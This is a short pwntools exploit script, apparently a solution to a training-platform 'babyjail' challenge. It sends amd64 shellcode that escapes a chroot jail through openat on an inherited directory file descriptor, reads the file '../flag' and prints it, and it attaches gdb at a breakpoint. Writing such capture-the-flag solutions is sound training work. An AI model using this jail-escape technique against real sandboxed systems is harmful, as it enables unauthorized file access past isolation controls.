#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary_path = './babyjail_level4'  # Adjust as needed

shellcode = asm('''

    mov rax, 257        /* SYS_openat */
    mov rdi, 3
    lea rsi, [rip+flag_path]
    xor rdx, rdx       /* O_RDONLY */
    xor r10, r10
    syscall
    
    /* Save flag fd */
    mov rbx, rax
    
    /* Read the flag content */
    xor rax, rax       /* SYS_read */
    mov rdi, rbx       /* Flag fd */
    lea rsi, [rip+buffer]
    mov rdx, 100       /* Read up to 100 bytes */
    syscall
    
    /* Save number of bytes read */
    mov r12, rax
    
    /* Write flag to stdout */
    mov rax, 1         /* SYS_write */
    mov rdi, 1         /* stdout */
    lea rsi, [rip+buffer]
    mov rdx, r12       /* Bytes read */
    syscall
    

flag_path:
    .string "../flag"    /* Absolute path to flag */
buffer:
    .space 100
''')

s = '''
b * main+1402
'''

p = process([binary_path, '/etc'])  # Open /etc directory

gdb.attach(p, s)
p.send(shellcode)

p.interactive()
